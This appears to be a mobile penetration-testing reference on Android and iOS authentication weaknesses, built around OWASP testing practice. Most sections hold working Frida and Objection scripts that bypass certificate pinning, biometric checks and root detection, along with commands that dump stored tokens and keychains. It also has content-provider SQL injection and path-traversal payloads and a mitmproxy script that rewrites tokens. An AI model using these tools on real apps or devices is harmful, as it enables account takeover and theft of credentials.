# Mobile Authentication Vulnerabilities

## Overview

This document covers authentication vulnerabilities specific to mobile applications (iOS and Android), including insecure storage, certificate pinning bypass, biometric bypass, and mobile API authentication attacks.

---

## 1. Insecure Token Storage

### 1.1 Android Token Storage Issues

#### SharedPreferences Vulnerabilities
```bash
# SharedPreferences location (root required)
/data/data/<package_name>/shared_prefs/

# Extract SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml"

# Or with root
adb shell su -c "cat /data/data/com.target.app/shared_prefs/*.xml"

# Common issues:
# - Tokens stored in plain text
# - Refresh tokens stored insecurely
# - No encryption applied

# Example vulnerable storage
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="access_token">eyJhbGciOiJIUzI1NiIs...</string>
    <string name="refresh_token">dGhpcyBpcyBhIHJlZnJlc2g...</string>
    <string name="user_id">12345</string>
</map>
```

#### SQLite Database Token Leakage
```bash
# Database locations
/data/data/<package_name>/databases/

# Extract database
adb shell "run-as com.target.app cat /data/data/com.target.app/databases/app.db" > app.db

# Analyze with sqlite3
sqlite3 app.db
> .tables
> SELECT * FROM users;
> SELECT * FROM tokens;
> SELECT * FROM sessions;

# Search for sensitive data
strings app.db | grep -i "token\|password\|key\|secret"
```

#### External Storage Issues
```bash
# Files on external storage are world-readable
/sdcard/Android/data/<package_name>/

# Check for sensitive files
adb shell ls -la /sdcard/Android/data/com.target.app/

# Common vulnerable patterns:
# - Log files with tokens
# - Backup files
# - Cache files with credentials
```

#### Secure Storage Bypass
```java
// Vulnerable: Using Android Keystore incorrectly
// Key can be extracted if device is compromised

// Check for BiometricPrompt bypass
// If setUserAuthenticationRequired(false), key is always accessible

// Frida script to dump Keystore
Java.perform(function() {
    var KeyStore = Java.use('java.security.KeyStore');
    KeyStore.getInstance.overload('java.lang.String').implementation = function(type) {
        console.log('KeyStore.getInstance: ' + type);
        return this.getInstance(type);
    };

    var KeyStoreSecretKey = Java.use('android.security.keystore.AndroidKeyStoreSecretKey');
    KeyStoreSecretKey.getEncoded.implementation = function() {
        var result = this.getEncoded();
        console.log('Key bytes: ' + bytesToHex(result));
        return result;
    };
});
```

### 1.2 iOS Token Storage Issues

#### Keychain Vulnerabilities
```bash
# Keychain dumping with objection
objection -g com.target.app explore
ios keychain dump

# Or with Frida
frida -U -f com.target.app -l keychain_dumper.js

# Check keychain accessibility levels:
# - kSecAttrAccessibleWhenUnlocked (secure)
# - kSecAttrAccessibleAfterFirstUnlock (less secure)
# - kSecAttrAccessibleAlways (insecure!)
```

#### NSUserDefaults Exposure
```bash
# NSUserDefaults location
/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences/

# Extract plist
frida -U -f com.target.app -l dump_nsuserdefaults.js

# Frida script
ObjC.choose(ObjC.classes.NSUserDefaults, {
    onMatch: function(instance) {
        console.log(instance.dictionaryRepresentation().toString());
    },
    onComplete: function() {}
});

# Common issues:
# - Access tokens in NSUserDefaults
# - Session identifiers stored insecurely
# - User credentials cached
```

#### Plist File Analysis
```bash
# Extract app container
ios-deploy --bundle_id com.target.app --download=/var/mobile/Containers/

# Find plist files
find . -name "*.plist" -exec plutil -p {} \;

# Convert binary plist to XML
plutil -convert xml1 Info.plist

# Search for sensitive data
grep -r "token\|password\|key\|secret" *.plist
```

#### Data Protection Class Issues
```swift
// Vulnerable: No protection class specified
try data.write(to: fileURL)  // Uses default, may be accessible when locked

// Check protection class with objection
objection -g com.target.app explore
ios plist cat <path_to_file>

// Files with NSFileProtectionNone are always accessible
// Even when device is locked
```

---

## 2. Certificate Pinning Bypass

### 2.1 Android SSL Pinning Bypass

#### Using Frida
```bash
# Universal SSL pinning bypass
frida -U -f com.target.app -l ssl_pinning_bypass.js --no-pause

# Common bypass script
Java.perform(function() {
    // TrustManager bypass
    var TrustManager = Java.registerClass({
        name: 'com.custom.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });

    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom').implementation = function(km, tm, sr) {
        this.init(km, [TrustManager.$new()], sr);
    };

    // OkHttp CertificatePinner bypass
    var CertificatePinner = Java.use('okhttp3.CertificatePinner');
    CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, peerCertificates) {
        console.log('Bypassing cert pinning for: ' + hostname);
        return;
    };

    // Trustkit bypass
    try {
        var TrustKit = Java.use('com.datatheorem.android.trustkit.TrustKit');
        TrustKit.getInstance.implementation = function() {
            return null;
        };
    } catch(e) {}
});
```

#### Using Objection
```bash
# Auto-bypass SSL pinning
objection -g com.target.app explore
android sslpinning disable

# Watch for certificate errors
android hooking watch class javax.net.ssl.TrustManager
```

#### Network Security Config Manipulation
```xml
<!-- Add to res/xml/network_security_config.xml -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="true">
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />  <!-- Trust user certs -->
        </trust-anchors>
    </base-config>
</network-security-config>

<!-- Requires repackaging the APK -->
```

#### APK Patching
```bash
# Decompile APK
apktool d target.apk -o target_decompiled

# Modify network_security_config.xml
# Or patch smali code to disable pinning

# Recompile
apktool b target_decompiled -o target_patched.apk

# Sign APK
jarsigner -keystore test.keystore target_patched.apk alias

# Install
adb install target_patched.apk
```

### 2.2 iOS SSL Pinning Bypass

#### Using Frida/Objection
```bash
# Objection SSL pinning bypass
objection -g com.target.app explore
ios sslpinning disable

# Frida universal bypass
frida -U -f com.target.app -l ios_ssl_bypass.js

# Bypass script for iOS
if (ObjC.available) {
    // NSURLSession bypass
    var NSURLSessionConfiguration = ObjC.classes.NSURLSessionConfiguration;
    Interceptor.attach(NSURLSessionConfiguration['- setTLSMinimumSupportedProtocol:'].implementation, {
        onEnter: function(args) {
            console.log('TLS config intercepted');
        }
    });

    // AFNetworking bypass
    try {
        var AFSecurityPolicy = ObjC.classes.AFSecurityPolicy;
        AFSecurityPolicy['- setSSLPinningMode:'].implementation = function(mode) {
            this.setSSLPinningMode_(0); // AFSSLPinningModeNone
        };
        AFSecurityPolicy['- setAllowInvalidCertificates:'].implementation = function(allow) {
            this.setAllowInvalidCertificates_(1);
        };
    } catch(e) {}

    // TrustKit bypass
    try {
        var TrustKit = ObjC.classes.TrustKit;
        TrustKit['+ initSharedInstanceWithConfiguration:'].implementation = function(config) {
            console.log('TrustKit disabled');
            return null;
        };
    } catch(e) {}
}
```

#### SSL Kill Switch 2
```bash
# For jailbroken devices
# Install from Cydia or compile from source

# Automatically bypasses:
# - NSURLSession
# - NSURLConnection
# - AFNetworking
# - Custom implementations
```

#### Binary Patching
```bash
# Extract IPA
unzip target.ipa -d target_extracted

# Find certificate pinning code
strings target_extracted/Payload/Target.app/Target | grep -i "pin\|cert\|ssl"

# Use Hopper/IDA to locate pinning functions
# Patch binary to NOP out validation

# Repack and resign
cd target_extracted
zip -r ../target_patched.ipa Payload/

# Resign with valid certificate
codesign -f -s "iPhone Developer" target_patched.ipa
```

---

## 3. Biometric Authentication Bypass

### 3.1 Android Biometric Bypass

#### Frida Biometric Hook
```javascript
// Bypass BiometricPrompt authentication
Java.perform(function() {
    // BiometricPrompt.AuthenticationCallback bypass
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');

    BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo').implementation = function(promptInfo) {
        console.log('[*] BiometricPrompt.authenticate() called');

        // Get callback
        var callback = this.mAuthenticationCallback.value;

        // Create fake successful result
        var CryptoObject = Java.use('androidx.biometric.BiometricPrompt$CryptoObject');
        var AuthenticationResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');

        // Trigger success callback
        Java.scheduleOnMainThread(function() {
            callback.onAuthenticationSucceeded(AuthenticationResult.$new(null));
        });
    };

    // Bypass FingerprintManager (legacy)
    var FingerprintManager = Java.use('android.hardware.fingerprint.FingerprintManager');
    FingerprintManager.authenticate.implementation = function(crypto, cancel, flags, callback, handler) {
        console.log('[*] FingerprintManager.authenticate() bypassed');

        // Create success result
        var AuthenticationResult = Java.use('android.hardware.fingerprint.FingerprintManager$AuthenticationResult');

        Java.scheduleOnMainThread(function() {
            callback.onAuthenticationSucceeded(AuthenticationResult.$new(crypto, null, 0));
        });
    };
});
```

#### CryptoObject Bypass
```javascript
// Some apps use CryptoObject for cryptographic operations
// Bypass requires more sophisticated approach

Java.perform(function() {
    // Hook key generation to disable user authentication requirement
    var KeyGenParameterSpec = Java.use('android.security.keystore.KeyGenParameterSpec$Builder');

    KeyGenParameterSpec.setUserAuthenticationRequired.implementation = function(required) {
        console.log('[*] setUserAuthenticationRequired: ' + required + ' -> false');
        return this.setUserAuthenticationRequired(false);
    };

    // Bypass BiometricPrompt with CryptoObject
    var BiometricPrompt = Java.use('androidx.biometric.BiometricPrompt');
    BiometricPrompt.authenticate.overload('androidx.biometric.BiometricPrompt$PromptInfo', 'androidx.biometric.BiometricPrompt$CryptoObject').implementation = function(info, crypto) {
        console.log('[*] BiometricPrompt.authenticate(CryptoObject) called');

        var callback = this.mAuthenticationCallback.value;
        var AuthenticationResult = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');

        Java.scheduleOnMainThread(function() {
            callback.onAuthenticationSucceeded(AuthenticationResult.$new(crypto));
        });
    };
});
```

### 3.2 iOS Biometric Bypass

#### LocalAuthentication Framework Bypass
```javascript
// Bypass Touch ID / Face ID
if (ObjC.available) {
    var LAContext = ObjC.classes.LAContext;

    // Hook evaluatePolicy:localizedReason:reply:
    Interceptor.attach(LAContext['- evaluatePolicy:localizedReason:reply:'].implementation, {
        onEnter: function(args) {
            console.log('[*] LAContext.evaluatePolicy called');

            // Get the reply block
            var reply = new ObjC.Block(args[4]);
            var originalReply = reply.implementation;

            // Replace with always-success
            reply.implementation = function(success, error) {
                console.log('[*] Bypassing biometric - returning success');
                originalReply(true, null);
            };
        }
    });

    // Bypass canEvaluatePolicy check
    Interceptor.attach(LAContext['- canEvaluatePolicy:error:'].implementation, {
        onLeave: function(retval) {
            retval.replace(1);  // Always return YES
        }
    });
}
```

#### Keychain Biometric Protection Bypass
```javascript
// Items protected with kSecAccessControlBiometryAny
if (ObjC.available) {
    // Hook SecItemCopyMatching to bypass biometric check
    var SecItemCopyMatching = Module.findExportByName('Security', 'SecItemCopyMatching');

    Interceptor.attach(SecItemCopyMatching, {
        onEnter: function(args) {
            // Modify query to remove biometric requirement
            var query = ObjC.Object(args[0]);
            console.log('[*] SecItemCopyMatching query: ' + query.toString());
        },
        onLeave: function(retval) {
            // Check for authentication error and retry
            if (retval.toInt32() === -25293) {  // errSecAuthFailed
                console.log('[*] Authentication failed, attempting bypass');
            }
        }
    });
}
```

### 3.3 Common Biometric Implementation Flaws

#### Client-Side Only Validation
```java
// VULNERABLE: Biometric only unlocks UI, not server session
public void onAuthenticationSucceeded(BiometricPrompt.AuthenticationResult result) {
    // Just shows next screen without server validation
    startActivity(new Intent(this, DashboardActivity.class));
}

// Attack: Hook onAuthenticationSucceeded to be called directly
// No cryptographic proof sent to server
```

#### Fallback Mechanism Abuse
```bash
# Many apps have PIN fallback after biometric failure
# PIN may be weaker than biometric

# Test:
# 1. Fail biometric 3-5 times
# 2. Check if PIN fallback appears
# 3. PIN may be brute-forceable
# 4. May be stored insecurely

# Check for PIN in SharedPreferences/Keychain
```

---

## 4. Deep Link Hijacking

### 4.1 Android Deep Link Attacks

#### Intent Scheme Hijacking
```xml
<!-- Vulnerable manifest - no verification -->
<activity android:name=".CallbackActivity">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="myapp"
              android:host="callback"/>
    </intent-filter>
</activity>

<!-- Attack: Register same scheme in malicious app -->
```

#### OAuth Redirect Hijacking
```bash
# Find OAuth redirect URIs in app
apktool d target.apk
grep -r "redirect_uri\|callback\|oauth" .

# In AndroidManifest.xml, look for:
# - Custom URI schemes (myapp://)
# - Deep links handling OAuth callbacks

# Attack steps:
# 1. Create malicious app with same intent filter
# 2. When user clicks OAuth link, Android shows app chooser
# 3. If user selects malicious app, attacker gets OAuth code
```

#### App Link Verification Bypass
```bash
# Check Digital Asset Links file
curl https://target.com/.well-known/assetlinks.json

# If not properly configured, App Links fall back to deep links
# Multiple apps can register same deep link

# Check app's link verification
adb shell pm get-app-links com.target.app
```

### 4.2 iOS URL Scheme Hijacking

#### Custom URL Scheme Attacks
```xml
<!-- Info.plist URL scheme -->
<key>CFBundleURLTypes</key>
<array>
    <dict>
        <key>CFBundleURLSchemes</key>
        <array>
            <string>myapp</string>
            <string>myapp-callback</string>
        </array>
    </dict>
</array>

<!-- Attack: Another app can register same scheme -->
<!-- iOS doesn't guarantee which app handles the URL -->
```

#### Universal Links Bypass
```bash
# Check apple-app-site-association
curl https://target.com/.well-known/apple-app-site-association
curl https://target.com/apple-app-site-association

# If not properly configured:
# - Links open in Safari instead of app
# - Or fallback to custom URL schemes

# Attack scenarios:
# 1. Universal link file missing/misconfigured
# 2. User can long-press to choose "Open in Safari"
# 3. OAuth tokens may be visible in Safari
```

#### Redirect Chain Exploitation
```bash
# OAuth flow:
# 1. App opens: https://auth.provider.com/authorize?redirect_uri=myapp://callback
# 2. After auth: Redirect to myapp://callback?code=ABC123

# Attack:
# 1. Register myapp:// scheme in malicious app
# 2. Phish user with OAuth link
# 3. Intercept authorization code
```

---

## 5. Intent Manipulation (Android)

### 5.1 Exported Component Attacks

#### Exported Activity Exploitation
```bash
# Find exported activities
aapt dump xmltree target.apk AndroidManifest.xml | grep -A5 "activity"

# Or with drozer
dz> run app.activity.info -a com.target.app
dz> run app.activity.start --component com.target.app com.target.app.AdminActivity

# Launch exported activity directly
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.AdminActivity --es "token" "malicious_data"
```

#### Broadcast Receiver Exploitation
```bash
# Find exported receivers
dz> run app.broadcast.info -a com.target.app

# Send malicious broadcast
adb shell am broadcast -a com.target.app.CUSTOM_ACTION \
    -n com.target.app/.MyReceiver \
    --es "data" "malicious_payload"

# Example: Push notification token theft
adb shell am broadcast -a com.google.firebase.MESSAGING_EVENT \
    -n com.target.app/.FirebaseReceiver \
    --es "token" "attacker_token"
```

#### Content Provider Attacks
```bash
# Find exported providers
dz> run app.provider.info -a com.target.app
dz> run scanner.provider.finduris -a com.target.app

# Query content provider
dz> run app.provider.query content://com.target.app.provider/users

# SQL injection in content provider
dz> run app.provider.query content://com.target.app.provider/users --selection "1=1) OR 1=1--"

# Path traversal
dz> run app.provider.read content://com.target.app.provider/../../../../../../etc/hosts
```

### 5.2 Pending Intent Hijacking

```java
// VULNERABLE: Mutable PendingIntent with implicit intent
Intent intent = new Intent();  // No component set
intent.setAction("com.target.app.ACTION");
PendingIntent pending = PendingIntent.getBroadcast(context, 0, intent,
    PendingIntent.FLAG_UPDATE_CURRENT);  // Missing FLAG_IMMUTABLE

// Attack: Malicious app can intercept and modify the intent
// Register receiver for com.target.app.ACTION
```

```bash
# Find PendingIntent usage in decompiled code
grep -r "PendingIntent" . --include="*.java" --include="*.smali"
grep -r "FLAG_MUTABLE" .
```

---

## 6. Mobile API Authentication Attacks

### 6.1 API Key Extraction

#### Android API Key Discovery
```bash
# Decompile APK
apktool d target.apk -o decompiled
jadx -d jadx_output target.apk

# Search for API keys
grep -rn "api_key\|apikey\|api-key\|API_KEY" decompiled/
grep -rn "Bearer\|Authorization" jadx_output/

# Check strings.xml
cat decompiled/res/values/strings.xml | grep -i "key\|api\|secret\|token"

# Check BuildConfig
cat jadx_output/*/BuildConfig.java

# Native libraries
strings decompiled/lib/*/lib*.so | grep -i "key\|api\|secret"

# Common locations:
# - res/values/strings.xml
# - assets/config.json
# - BuildConfig.java
# - Native .so files
# - SharedPreferences defaults
```

#### iOS API Key Discovery
```bash
# Extract IPA
unzip target.ipa -d extracted

# Search binary
strings extracted/Payload/Target.app/Target | grep -i "api\|key\|secret\|token"

# Check Info.plist
plutil -p extracted/Payload/Target.app/Info.plist | grep -i "key\|api"

# Search embedded files
find extracted -name "*.plist" -o -name "*.json" -exec grep -l "api\|key" {} \;

# Class-dump to find key storage
class-dump extracted/Payload/Target.app/Target > classes.txt
grep -i "apikey\|secret" classes.txt
```

### 6.2 Token Extraction

#### Runtime Token Extraction with Frida
```javascript
// Hook HTTP client to capture tokens
Java.perform(function() {
    // OkHttp interceptor
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Builder = Java.use('okhttp3.OkHttpClient$Builder');

    Builder.build.implementation = function() {
        var client = this.build();
        console.log('[*] OkHttpClient built, intercepting requests');
        return client;
    };

    // Hook Request.Builder to see headers
    var RequestBuilder = Java.use('okhttp3.Request$Builder');
    RequestBuilder.addHeader.implementation = function(name, value) {
        console.log('[*] Header: ' + name + ': ' + value);
        if (name.toLowerCase().includes('authorization') ||
            name.toLowerCase().includes('token')) {
            console.log('[!] AUTH TOKEN FOUND: ' + value);
        }
        return this.addHeader(name, value);
    };

    // Retrofit
    var Retrofit = Java.use('retrofit2.Retrofit');
    var RetrofitBuilder = Java.use('retrofit2.Retrofit$Builder');
    RetrofitBuilder.baseUrl.overload('java.lang.String').implementation = function(url) {
        console.log('[*] Retrofit baseUrl: ' + url);
        return this.baseUrl(url);
    };
});
```

#### Memory Token Extraction
```bash
# Dump app memory
frida -U -f com.target.app -l memory_dump.js

# Search memory for tokens
fridump -U -s com.target.app

# Search dump files
strings dump/* | grep -E "eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+"  # JWT
strings dump/* | grep -i "bearer\|token\|session"
```

### 6.3 Traffic Interception

#### Man-in-the-Middle Setup
```bash
# Setup proxy (Burp Suite)
# Configure device proxy settings

# For HTTPS interception:
# 1. Export Burp CA certificate
# 2. Install on device

# Android (user CA for apps targeting SDK 24+)
# Requires rooted device or app modification
adb push cacert.der /data/local/tmp/
adb shell su -c "mount -o rw,remount /system"
adb shell su -c "cp /data/local/tmp/cacert.der /system/etc/security/cacerts/9a5ba575.0"

# iOS
# Install profile from: http://burp/cert
```

#### Intercepting with mitmproxy
```bash
# Start mitmproxy
mitmproxy -p 8080

# Or with web interface
mitmweb -p 8080

# Capture specific patterns
mitmdump -p 8080 -w capture.flow --set flow_detail=3 -k

# Filter for auth endpoints
mitmdump -p 8080 "~u /auth|/login|/token" -k
```

#### Request/Response Modification
```python
# mitmproxy script for token manipulation
from mitmproxy import http

def request(flow: http.HTTPFlow):
    # Log auth headers
    auth = flow.request.headers.get("Authorization", "")
    if auth:
        print(f"[AUTH] {flow.request.url}: {auth}")

    # Modify token
    if "Authorization" in flow.request.headers:
        flow.request.headers["Authorization"] = "Bearer modified_token"

def response(flow: http.HTTPFlow):
    # Extract tokens from responses
    if "token" in flow.response.text.lower():
        print(f"[TOKEN RESPONSE] {flow.response.text[:500]}")
```

### 6.4 Frida and Objection Techniques

#### Frida Basic Usage
```bash
# List running apps
frida-ps -U

# Attach to running app
frida -U com.target.app

# Spawn and attach
frida -U -f com.target.app --no-pause

# Load script
frida -U -f com.target.app -l script.js

# Common scripts:
# - SSL pinning bypass
# - Root detection bypass
# - Biometric bypass
# - Token extraction
# - Method tracing
```

#### Objection Commands
```bash
# Start objection
objection -g com.target.app explore

# Common commands:
# SSL pinning
android sslpinning disable
ios sslpinning disable

# Root/Jailbreak detection
android root disable
ios jailbreak disable

# Keychain/KeyStore
ios keychain dump
android keystore list
android keystore clear

# Hook methods
android hooking watch class com.target.app.AuthManager
android hooking watch class_method com.target.app.AuthManager.getToken --dump-args --dump-return

# Search for classes/methods
android hooking search classes auth
android hooking search methods login

# Dump memory
memory dump all auth_dump

# File system
ios plist cat /path/to/file.plist
android hooking search classes SharedPreferences
```

#### Advanced Frida Scripts
```javascript
// Complete auth bypass script
Java.perform(function() {
    console.log('[*] Starting auth bypass');

    // 1. Bypass root detection
    var RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
    RootBeer.isRooted.implementation = function() {
        console.log('[*] Root check bypassed');
        return false;
    };

    // 2. Bypass SSL pinning (see earlier sections)

    // 3. Extract tokens
    var SharedPreferences = Java.use('android.app.SharedPreferencesImpl');
    SharedPreferences.getString.implementation = function(key, defValue) {
        var value = this.getString(key, defValue);
        if (key.toLowerCase().includes('token') || key.toLowerCase().includes('auth')) {
            console.log('[*] SharedPreferences.' + key + ' = ' + value);
        }
        return value;
    };

    // 4. Hook authentication methods
    var targetClass = Java.use('com.target.app.auth.AuthManager');
    targetClass.login.implementation = function(username, password) {
        console.log('[*] Login called: ' + username + ':' + password);
        return this.login(username, password);
    };

    targetClass.getAccessToken.implementation = function() {
        var token = this.getAccessToken();
        console.log('[*] Access Token: ' + token);
        return token;
    };

    // 5. Bypass biometric (see earlier sections)

    console.log('[*] Auth bypass hooks installed');
});
```

---

## 7. Mobile Security Testing Checklist

### Storage Security
```yaml
Android:
  - [ ] Check SharedPreferences for sensitive data
  - [ ] Check SQLite databases for credentials
  - [ ] Verify KeyStore usage and configuration
  - [ ] Check external storage for sensitive files
  - [ ] Verify backup exclusion (allowBackup=false)
  - [ ] Check for hardcoded secrets in code

iOS:
  - [ ] Check Keychain for proper accessibility levels
  - [ ] Verify NSUserDefaults doesn't contain secrets
  - [ ] Check for sensitive data in plist files
  - [ ] Verify Data Protection class usage
  - [ ] Check for excluded backup items
  - [ ] Review binary for hardcoded secrets
```

### Network Security
```yaml
Both Platforms:
  - [ ] Test SSL/TLS configuration
  - [ ] Verify certificate pinning implementation
  - [ ] Check for certificate pinning bypass
  - [ ] Test for HTTP downgrade attacks
  - [ ] Verify secure cipher suites
  - [ ] Check for sensitive data in URLs
  - [ ] Test API authentication mechanisms
```

### Authentication
```yaml
Both Platforms:
  - [ ] Test biometric implementation security
  - [ ] Check for biometric bypass vulnerabilities
  - [ ] Verify server-side session management
  - [ ] Test session timeout handling
  - [ ] Check for insecure fallback mechanisms
  - [ ] Verify token storage security
  - [ ] Test for session fixation
```

### Platform-Specific
```yaml
Android:
  - [ ] Check exported components security
  - [ ] Test for intent injection
  - [ ] Verify deep link handling
  - [ ] Test PendingIntent security
  - [ ] Check for WebView vulnerabilities
  - [ ] Test for tapjacking

iOS:
  - [ ] Verify URL scheme handling
  - [ ] Test Universal Links configuration
  - [ ] Check for pasteboard data leakage
  - [ ] Test for keyboard cache issues
  - [ ] Verify screenshot prevention
```

---

## 8. Tool Reference

### Essential Tools
```bash
# Static Analysis
apktool        # Android APK decompilation
jadx           # Java decompiler for Android
class-dump     # iOS class extraction
Hopper/IDA     # Binary analysis
MobSF          # Automated mobile security testing

# Dynamic Analysis
Frida          # Dynamic instrumentation
Objection      # Frida-based exploration
Drozer         # Android security testing
Cycript        # iOS runtime manipulation

# Network Analysis
Burp Suite     # HTTP proxy
mitmproxy      # HTTP proxy with scripting
Charles Proxy  # HTTP proxy (macOS)
Wireshark      # Network protocol analyzer

# Device Tools
adb            # Android Debug Bridge
ios-deploy     # iOS app deployment
ideviceinstaller # iOS app management
checkra1n/unc0ver # iOS jailbreaks
Magisk         # Android rooting
```

---

## References

- OWASP Mobile Security Testing Guide: https://owasp.org/www-project-mobile-security-testing-guide/
- OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/
- Frida Documentation: https://frida.re/docs/
- Objection Wiki: https://github.com/sensepost/objection/wiki
- Android Security Documentation: https://developer.android.com/training/articles/security-tips
- iOS Security Guide: https://support.apple.com/guide/security/
- HackTricks Mobile: https://book.hacktricks.xyz/mobile-apps-pentesting/
